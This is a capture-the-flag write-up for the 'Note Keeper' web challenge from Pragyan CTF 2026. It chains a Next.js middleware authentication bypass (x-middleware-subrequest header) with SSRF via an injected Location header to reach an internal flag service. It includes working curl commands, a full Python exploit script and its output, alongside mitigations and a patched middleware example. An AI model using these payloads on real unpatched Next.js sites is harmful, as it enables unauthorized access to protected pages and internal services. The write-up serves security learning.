# Note Keeper

**CTF/platform:** Pragyan CTF 2026

**Category:** Web

**Difficulty:** Medium-Hard

**Description:** Can you reach what you're not supposed to?

**Remote:** `https://note-keeper.ctf.prgy.in`

**Flag:** `p_ctf{Ju$t_u$e_VITE_e111d821}`

---

## Reconnaissance

### First inspection

Accessing the URL we find a notes application with a minimalist interface. We review the HTML source code:

```bash
curl -s https://note-keeper.ctf.prgy.in/ | head -30
```

**Immediate findings:**

1. **Title:** "Safe Notes App"
2. **Login link:** `/login?state=L2FkbWlu`
   - `L2FkbWlu` → Base64 of `/admin`
   - Indicates a protected `/admin` route exists
3. **Framework:** Next.js (detected by `/_next/static/` in assets)

### Version identification

In the 401 response from `/admin`:

```html
<!--Request Forbidden by Next.js 15.1.1 Middleware-->
```

**Next.js 15.1.1** — version with known vulnerabilities.

### Route enumeration

```
/           → 200  Public homepage
/login      → 200  Login form (non-functional)
/admin      → 401  Admin panel (middleware protected)
/api/login  → 500  "LOGIN NOT IMPLEMENTED"
```

---

## Step 1: Middleware Bypass (CVE-2025-29927)

### Vulnerability description

CVE-2025-29927 allows bypassing Next.js middleware using the internal `x-middleware-subrequest` header. This header is used internally by Next.js to avoid subrequest loops; if repeated enough times, the middleware self-disables.

**Affected versions:** Next.js < 12.3.5, < 13.5.9, < 14.2.25, < 15.2.3

### PoC

```bash
curl -s "https://note-keeper.ctf.prgy.in/admin" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```

**Result:** Full access to admin panel without authentication.

### Information extracted from admin panel

**7 notes** from administrator, 3 of them with critical clues:

| # | Content | Relevance |
|---|-----------|------------|
| 4 | "That old Next.js middleware vulnerability email is still sitting in my inbox." | Confirms CVE-2025-29927 |
| 6 | "Should call Nair for some code review here https://pastebin.com/GNQ36Hn4" | **Middleware source code** |
| 7 | "Backend stuff WyIvc3RhdHMiLCAiL25vdGVzIiwgIi9mbGFnIiwgIi8iXQ==" | **Internal backend routes** |

We decode note 7:

```bash
echo "WyIvc3RhdHMiLCAiL25vdGVzIiwgIi9mbGFnIiwgIi8iXQ==" | base64 -d
# ["/stats", "/notes", "/flag", "/"]
```

**Clear objective:** access `backend:4000/flag` — an internal Docker service not accessible from outside.

---

## Step 2: Middleware Analysis (Pastebin)

The Pastebin link reveals complete middleware code:

```javascript
import { NextResponse } from "next/server";
import { isAdminFunc } from "./lib/auth";

export const matcher = ['/(?!api|_next/static|_next/image|favicon.ico).*)'];

export function middleware(request) {
  const url = request.nextUrl.clone();

  if (url.pathname.startsWith('/admin')) {
    const isAdmin = isAdminFunc(request);
    if (!isAdmin) {
      return new NextResponse(`<html>...Unauthorized...</html>`, {
        status: 401,
        headers: { 'Content-Type': 'text/html' }
      });
    }
  }

  if (url.pathname.startsWith('/api')) {
    return NextResponse.next({
      headers: request.headers  // ← VULNERABLE
    });
  }

  return NextResponse.next();
}
```

### Line-by-line analysis

1. **Matcher:** Excludes `/api`, `/_next/static`, `/_next/image` and `favicon.ico`
2. **Routes `/admin`:** Require authentication (bypassed with CVE-2025-29927)
3. **Routes `/api`:** Pass **all request headers** directly to `NextResponse.next()`

The critical line is:

```javascript
return NextResponse.next({
    headers: request.headers  // ← Passes ALL headers unfiltered
});
```

The developer's comment says *"required for api routes for decoding Auth Header"*, but passing **all** headers unfiltered introduces an SSRF vulnerability.

---

## Step 3: Application Architecture

Analyzing admin panel JavaScript (`/_next/static/chunks/app/admin/page-*.js`):

```javascript
let n = "http://backend:4000";

// Client-side: periodic stats fetch
fetch(n + "/stats").then(e => e.json()).then(e => { ... })

// Client-side: create note
fetch(n + "/notes", { method: "POST", headers: {"Content-Type": "text/plain"}, body: t })

// Client-side: delete note
fetch(n + "/notes", { method: "DELETE", headers: {"Content-Type": "text/plain"}, body: e })
```

**Architecture:**

```
┌──────────────────────────────────────────────────────┐
│  Browser (Client)                                    │
│  - Cannot resolve "backend:4000" (Docker network)    │
└──────────────┬───────────────────────────────────────┘
               │ HTTPS
               ▼
┌──────────────────────────────────────────────────────┐
│  Next.js 15.1.1 (port 3000)                          │
│  - Vulnerable middleware (CVE-2025-29927)            │
│  - Passes headers unfiltered (CVE-2025-57822)        │
│  - SSR: fetch to backend:4000 to render /admin       │
└──────────────┬───────────────────────────────────────┘
               │ HTTP (internal Docker network)
               ▼
┌──────────────────────────────────────────────────────┐
│  Express Backend (backend:4000)                      │
│  - GET /stats  → Statistics                          │
│  - GET /notes  → Note list                           │
│  - GET /flag   → 🏴 FLAG                             │
│  - GET /       → "Hello World!"                      │
│  - NOT accessible from outside                       │
└──────────────────────────────────────────────────────┘
```

The challenge is clear: we need the Next.js server (which CAN access `backend:4000`) to make a request to `/flag` for us. This is **Server-Side Request Forgery (SSRF)**.

---

## Step 4: SSRF via CVE-2025-57822

### Vulnerability description

**CVE-2025-57822** is a Next.js vulnerability that allows SSRF when middleware passes request headers directly to `NextResponse.next()`.

The internal Next.js mechanism processes certain headers specially. One of them is `Location`: when it appears in middleware response (via `NextResponse.next({ headers })`), Next.js interprets it as an **internal redirect** and performs a server-side fetch to that URL, returning the response to the client.

**Affected versions:**
- Next.js >= 15.0.0, < 15.4.7
- Next.js >= 0.9.9, < 14.2.32

**Our target:** Next.js 15.1.1 ✅ (within vulnerable range)

### Conditions for exploitation

1. ✅ Middleware passes `request.headers` to `NextResponse.next()`
2. ✅ Application is self-hosted (not Vercel)
3. ✅ Internal service accessible from server exists

### Attack flow

```
1. Attacker sends:  GET /api/login
                    Location: http://backend:4000/flag

2. Middleware intercepts request to /api/*:
   → Executes NextResponse.next({ headers: request.headers })
   → Attacker's headers (including Location) passed to Next.js

3. Next.js processes Location header internally:
   → Detects Location: http://backend:4000/flag
   → Makes server-side fetch to http://backend:4000/flag
   → Returns result to client

4. Attacker receives: p_ctf{Ju$t_u$e_VITE_e111d821}
```

### Important detail: DO NOT use middleware bypass

Contradicting intuition, the exploit **requires middleware to execute**:

| Scenario | Result | Reason |
|-----------|-----------|-------|
| **Without** bypass (middleware executes) | ✅ Flag | Middleware passes headers → Next.js processes `Location` |
| **With** bypass (`x-middleware-subrequest`) | ❌ 405 | Middleware skipped → headers not processed → no SSRF |

This is because the bypass makes middleware **not execute at all**, so the line `NextResponse.next({ headers: request.headers })` is never reached and the `Location` header is not processed.

---

## Exploit

### One-liner

```bash
curl -s "https://note-keeper.ctf.prgy.in/api/login" \
  -H "Location: http://backend:4000/flag"
```

**Output:**

```
p_ctf{Ju$t_u$e_VITE_e111d821}
```

### Complete exploitation script

```python
#!/usr/bin/env python3
"""
Note Keeper - Pragyan CTF 2026
Exploit: CVE-2025-29927 (middleware bypass) + CVE-2025-57822 (SSRF via Location)
"""

import requests
import base64
import sys

BASE = "https://note-keeper.ctf.prgy.in"
BYPASS = "middleware:middleware:middleware:middleware:middleware"

s = requests.Session()

# ============================================================
# STEP 1: CVE-2025-29927 — Middleware Bypass
# ============================================================
print("[*] Step 1: Middleware bypass (CVE-2025-29927)")

r = s.get(f"{BASE}/admin", headers={"x-middleware-subrequest": BYPASS})

if r.status_code == 200 and "Safe Notes App" in r.text:
    print("[✓] Access to /admin obtained")
else:
    print(f"[✗] Failed: {r.status_code}")
    sys.exit(1)

# Extract admin notes
import re
notes = re.findall(r'"text":"([^"]+)"', r.text)
print(f"[✓] {len(notes)} notes extracted from admin")

# Search for clues
for i, note in enumerate(notes, 1):
    if "pastebin" in note.lower() or "backend" in note.lower() or "middleware" in note.lower():
        print(f"    Note {i} (clue): {note}")

# Decode backend routes
b64_match = re.search(r'[A-Za-z0-9+/]{20,}={1,2}', r.text)
if b64_match:
    decoded = base64.b64decode(b64_match.group()).decode()
    print(f"[✓] Backend routes: {decoded}")

# ============================================================
# STEP 2: CVE-2025-57822 — SSRF via Location header
# ============================================================
print(f"\n[*] Step 2: SSRF to internal backend (CVE-2025-57822)")

# Enumerate all backend endpoints
backend_paths = ["/flag", "/stats", "/notes", "/"]

for path in backend_paths:
    target = f"http://backend:4000{path}"

    r = s.get(f"{BASE}/api/login", headers={"Location": target})

    print(f"\n    GET backend:4000{path}")
    print(f"    Status: {r.status_code}")

    if path == "/flag":
        if "p_ctf{" in r.text:
            flag = r.text.strip()
            print(f"    ★★★ FLAG: {flag}")
        else:
            print(f"    Response: {r.text[:200]}")
    else:
        print(f"    Response: {r.text[:100]}")

# ============================================================
# Result
# ============================================================
print(f"\n{'='*50}")
print(f"FLAG: {flag}")
print(f"{'='*50}")
```

### Script execution

```
$ python3 exploit_note_keeper.py

[*] Step 1: Middleware bypass (CVE-2025-29927)
[✓] Access to /admin obtained
[✓] 7 notes extracted from admin
    Note 4 (clue): That old Next.js middleware vulnerability email is still sitting in my inbox.
    Note 6 (clue): Should call Nair for some code review here https://pastebin.com/GNQ36Hn4
    Note 7 (clue): Backend stuff WyIvc3RhdHMiLCAiL25vdGVzIiwgIi9mbGFnIiwgIi8iXQ==
[✓] Backend routes: ["/stats", "/notes", "/flag", "/"]

[*] Step 2: SSRF to internal backend (CVE-2025-57822)

    GET backend:4000/flag
    Status: 200
    ★★★ FLAG: p_ctf{Ju$t_u$e_VITE_e111d821}

    GET backend:4000/stats
    Status: 200
    Response: {"totalUsers":1,"totalNotes":7,"totalCharacters":470}

    GET backend:4000/notes
    Status: 200
    Response: [{"id":"25e1f426-729c-4187-b2ee-188380b23bb5","text":"Damn I hate UI/UX, I should hire someo

    GET backend:4000/
    Status: 200
    Response: Hello World!

==================================================
FLAG: p_ctf{Ju$t_u$e_VITE_e111d821}
==================================================
```

---

## Flag

```
p_ctf{Ju$t_u$e_VITE_e111d821}
```

Translation: "Just use Vite" — the author ironically suggests using Vite (simpler framework) would avoid Next.js vulnerabilities.

---

## Complete exploitation chain

```
Reconnaissance
    │
    ├─ Detect Next.js 15.1.1 (HTML comment in /admin)
    ├─ Identify protected route /admin
    │
    ▼
CVE-2025-29927: Middleware Bypass
    │
    ├─ Header: x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
    ├─ Access /admin without authentication
    ├─ Extract notes → middleware code (Pastebin) + backend routes (Base64)
    │
    ▼
Middleware Analysis
    │
    ├─ NextResponse.next({ headers: request.headers }) on /api/* routes
    ├─ All request headers passed unfiltered
    ├─ Identify CVE-2025-57822
    │
    ▼
CVE-2025-57822: SSRF via Location Header
    │
    ├─ GET /api/login with header Location: http://backend:4000/flag
    ├─ Next.js processes Location as internal redirect
    ├─ Server-side fetch to backend:4000/flag
    │
    ▼
FLAG: p_ctf{Ju$t_u$e_VITE_e111d821}
```

---

## Lessons

### About CVE-2025-29927 (Middleware Bypass)

- **Root cause:** Next.js uses an internal header (`x-middleware-subrequest`) to track middleware subrequests. If the header contains enough repetitions of the middleware name, it disables to avoid infinite loops.
- **Impact:** Complete bypass of any authentication/authorization logic implemented in middleware.
- **Mitigation:** Update to Next.js >= 15.2.3 (or patched version of your branch).

### About CVE-2025-57822 (SSRF via Location)

- **Root cause:** `NextResponse.next()` processes the `Location` header as an internal redirect, making a server-side fetch to the specified URL.
- **Condition:** Middleware must pass `request.headers` directly to `NextResponse.next()`.
- **Impact:** Full SSRF — access to internal services not publicly exposed.
- **Mitigation:** Update to Next.js >= 15.4.7, or filter sensitive headers before passing to `NextResponse.next()`:

```javascript
// Safe version of middleware
if (url.pathname.startsWith('/api')) {
    const safeHeaders = new Headers(request.headers);
    safeHeaders.delete('location');        // Prevent SSRF
    safeHeaders.delete('host');            // Prevent host injection
    safeHeaders.delete('x-forwarded-host');
    return NextResponse.next({ headers: safeHeaders });
}
```

### General principle

Never pass user input (headers, parameters, cookies) directly to framework functions without sanitization. Even headers that seem harmless can have special behavior in the underlying framework.

---

## CVEs Used

| CVE | Description | CVSS | Affected Versions |
|-----|-------------|------|---------------------|
| CVE-2025-29927 | Next.js Middleware Authorization Bypass | 9.1 | < 12.3.5, < 13.5.9, < 14.2.25, < 15.2.3 |
| CVE-2025-57822 | Next.js Middleware SSRF via Location Header | 6.5 | >= 15.0.0 < 15.4.7, >= 0.9.9 < 14.2.32 |

## References

- [CVE-2025-29927 - Datadog Security Labs](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/)
- [CVE-2025-57822 - GitHub Advisory](https://github.com/advisories/GHSA-4342-x723-ch2f)
- [Intigriti CTF 0825 - CatFlix SSRF Writeup](https://www.intigriti.com/researchers/blog/hacking-tools/catflix-ctf-ssrf-nextjs-middleware)
- [Digging for SSRF in NextJS apps - Assetnote](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps)

## Tools Used

- `curl` — Manual HTTP requests
- `python3` + `requests` — Automated exploitation script
- `base64` — Clue decoding
- Browser — Source code and JS inspection

---

## Useful Commands

```bash
# Bypass middleware and access admin
curl -s "https://note-keeper.ctf.prgy.in/admin" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

# SSRF to internal backend (get flag)
curl -s "https://note-keeper.ctf.prgy.in/api/login" \
  -H "Location: http://backend:4000/flag"

# Enumerate complete backend
for path in / /stats /notes /flag; do
  echo "=== $path ==="
  curl -s "https://note-keeper.ctf.prgy.in/api/login" \
    -H "Location: http://backend:4000$path"
  echo
done
```

---

## PoC

### Exploit Execution

<img src="notes.png" alt="Exploit execution" width="800">

*Screenshot showing successful exploit execution combining CVE-2025-29927 (middleware bypass) and CVE-2025-57822 (SSRF) to obtain the flag.*
